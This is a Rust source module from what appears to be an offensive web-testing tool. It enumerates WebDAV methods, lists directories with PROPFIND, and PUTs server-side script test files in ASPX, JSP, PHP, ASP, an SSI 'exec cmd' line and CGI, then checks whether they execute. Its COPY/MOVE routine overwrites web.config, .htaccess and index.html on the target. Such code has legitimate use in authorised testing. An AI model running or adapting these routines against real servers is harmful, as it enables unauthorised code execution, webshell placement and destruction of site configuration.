use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn methods(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WebDAV Method Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let resp = client.request(reqwest::Method::OPTIONS, url).send().await?;
    let allow = resp.headers().get("allow").and_then(|v| v.to_str().ok()).unwrap_or("");
    let dav = resp.headers().get("dav").and_then(|v| v.to_str().ok()).unwrap_or("");

    println!("  {} Allow: {}", "*".cyan(), allow);
    println!("  {} DAV:   {}", "*".cyan(), dav);

    let webdav_methods = ["PROPFIND", "COPY", "MOVE", "LOCK", "UNLOCK", "MKCOL", "PUT", "DELETE", "PROPPATCH", "REPORT", "VERSION-CONTROL", "CHECKOUT", "CHECKIN", "UNCHECKOUT", "MKWORKSPACE", "UPDATE", "LABEL", "MERGE", "BASELINE-CONTROL", "MKACTIVITY"];
    let allowed: Vec<&str> = webdav_methods.iter().filter(|m| allow.contains(**m)).copied().collect();

    if allowed.is_empty() {
        println!("\n  {} No WebDAV methods allowed.", "[-]".green().bold());
    } else {
        println!("\n  {} WebDAV methods enabled:", "[!]".red().bold());
        for m in &allowed {
            let danger = match *m {
                "PUT" => " — file upload (webshell!)",
                "DELETE" => " — file deletion",
                "COPY" | "MOVE" => " — file manipulation",
                "MKCOL" => " — directory creation",
                "PROPFIND" => " — directory listing",
                "LOCK" | "UNLOCK" => " — resource locking",
                _ => "",
            };
            println!("    {} {:15} {}", "*".red(), m, danger);
        }
    }
    Ok(())
}

pub async fn propfind(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WebDAV PROPFIND Directory Listing", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let propfind_body = r#"<?xml version="1.0" encoding="utf-8"?>
<D:propfind xmlns:D="DAV:">
  <D:allprop/>
</D:propfind>"#;

    let resp = client.request(reqwest::Method::from_bytes(b"PROPFIND").unwrap(), url)
        .header("Depth", "1")
        .header("Content-Type", "application/xml")
        .body(propfind_body)
        .send().await?;

    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 207 {
        println!("  {} PROPFIND successful (207 Multi-Status)", "[+]".green().bold());
        let href_re = regex::Regex::new(r"<D:href>([^<]+)</D:href>|<d:href>([^<]+)</d:href>").ok();
        if let Some(re) = href_re {
            let hrefs: Vec<_> = re.captures_iter(&body).filter_map(|c| c.get(1).or_else(|| c.get(2)).map(|m| m.as_str().to_string())).collect();
            if !hrefs.is_empty() {
                println!("\n  {} Resources found ({}):", "[*]".cyan().bold(), hrefs.len());
                for href in hrefs.iter().take(50) {
                    let is_dir = href.ends_with('/');
                    let tag = if is_dir { "DIR".cyan().to_string() } else { "FILE".to_string() };
                    println!("    {} [{}] {}", "*".cyan(), tag, href);
                }
                if hrefs.len() > 50 { println!("    ... and {} more", hrefs.len() - 50); }
            }
        }
    } else {
        println!("  {} PROPFIND returned status {}", "*".red(), status);
        let snippet = body.chars().take(200).collect::<String>();
        if !snippet.is_empty() { println!("  {} Response: {}", "*".dimmed(), snippet); }
    }
    Ok(())
}

pub async fn upload(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WebDAV PUT Upload Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let test_files = [
        ("ps_test.html", "text/html", "<html><body>PledgeStrike test</body></html>"),
        ("ps_test.txt", "text/plain", "PledgeStrike test file"),
        ("ps_test.aspx", "text/html", "<%@ Page Language=\"C#\" %><% Response.Write(\"PS\"); %>"),
        ("ps_test.jsp", "text/html", "<% out.println(\"PS\"); %>"),
        ("ps_test.php", "text/html", "<?php echo 'PS'; ?>"),
        ("ps_test.asp", "text/html", "<% Response.Write(\"PS\") %>"),
        ("ps_test.shtml", "text/html", "<!--#exec cmd=\"id\" -->"),
        ("ps_test.cgi", "text/plain", "#!/bin/sh\necho PS"),
    ];

    for (filename, content_type, content) in &test_files {
        let target = format!("{}/{}", url.trim_end_matches('/'), filename);
        match client.put(&target).header("Content-Type", *content_type).body(*content).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let uploaded = status == 200 || status == 201 || status == 204;
                let tag = if uploaded { "UPLOADED".red().bold().to_string() } else { format!("status={}", status) };
                println!("  {} {:25} {}", "*".cyan(), filename, tag);

                if uploaded {
                    let verify = client.get(&target).send().await;
                    if let Ok(vresp) = verify {
                        let vstatus = vresp.status().as_u16();
                        let vbody = vresp.text().await.unwrap_or_default();
                        let accessible = vstatus == 200 && vbody.contains("PS");
                        let vtag = if accessible { "EXECUTED".red().bold().to_string() } else if vstatus == 200 { "accessible".to_string() } else { format!("status={}", vstatus) };
                        println!("    {} Verify: {}", "*".cyan(), vtag);
                    }
                }
            }
            Err(_) => { println!("  {} {:25} error", "*".red(), filename); }
        }
    }

    println!("\n{} If upload succeeds and file is accessible, webshell deployment is possible.", "[*]".cyan().bold());
    Ok(())
}

pub async fn copy(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WebDAV COPY/MOVE Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let operations = [
        ("COPY to webroot", "COPY", "/ps_test.txt", "/ps_copy.txt"),
        ("COPY to config", "COPY", "/ps_test.txt", "/web.config"),
        ("COPY overwrite", "COPY", "/ps_test.txt", "/index.html"),
        ("MOVE to webroot", "MOVE", "/ps_test.txt", "/ps_moved.txt"),
        ("MOVE to admin", "MOVE", "/ps_test.txt", "/admin/config.aspx"),
        ("COPY to .htaccess", "COPY", "/ps_test.txt", "/.htaccess"),
    ];

    for (name, method, src, dst) in &operations {
        let src_url = format!("{}/{}", url.trim_end_matches('/'), src.trim_start_matches('/'));
        let dst_url = format!("{}/{}", url.trim_end_matches('/'), dst.trim_start_matches('/'));
        match client.request(reqwest::Method::from_bytes(method.as_bytes()).unwrap(), &src_url)
            .header("Destination", &dst_url)
            .header("Overwrite", "T")
            .send().await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let success = status == 200 || status == 201 || status == 204;
                let tag = if success { "SUCCESS".red().bold().to_string() } else { format!("status={}", status) };
                println!("  {} {:25} {} -> {} {}", "*".cyan(), name, src, dst, tag);
            }
            Err(_) => { println!("  {} {:25} error", "*".red(), name); }
        }
    }

    println!("\n{} COPY/MOVE can overwrite config files or move webshells to webroot.", "[*]".cyan().bold());
    Ok(())
}
